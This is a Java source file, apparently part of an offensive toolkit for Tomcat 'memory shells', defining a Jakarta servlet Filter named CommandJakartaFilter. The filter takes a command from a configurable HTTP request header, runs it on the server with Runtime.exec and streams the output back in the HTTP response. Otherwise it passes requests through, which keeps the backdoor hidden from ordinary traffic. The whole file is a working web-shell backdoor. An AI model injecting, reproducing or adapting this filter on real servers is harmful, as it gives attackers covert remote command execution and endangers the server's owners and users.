package com.reajason.javaweb.memsell.tomcat.command;

import jakarta.servlet.*;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;

import java.io.IOException;
import java.io.InputStream;

/**
 * @author ReaJason
 * @since 2024/11/24
 */
public class CommandJakartaFilter implements Filter {
    public String headerName;

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
        HttpServletRequest servletRequest = (HttpServletRequest) request;
        HttpServletResponse servletResponse = (HttpServletResponse) response;
        String cmd = servletRequest.getHeader(headerName);
        try {
            if (cmd != null) {
                Process exec = Runtime.getRuntime().exec(cmd);
                InputStream inputStream = exec.getInputStream();
                ServletOutputStream outputStream = servletResponse.getOutputStream();
                byte[] buf = new byte[8192];
                int length;
                while ((length = inputStream.read(buf)) != -1) {
                    outputStream.write(buf, 0, length);
                }
            } else {
                chain.doFilter(servletRequest, servletResponse);
            }
        } catch (Exception e) {
            chain.doFilter(servletRequest, servletResponse);
        }
    }

}
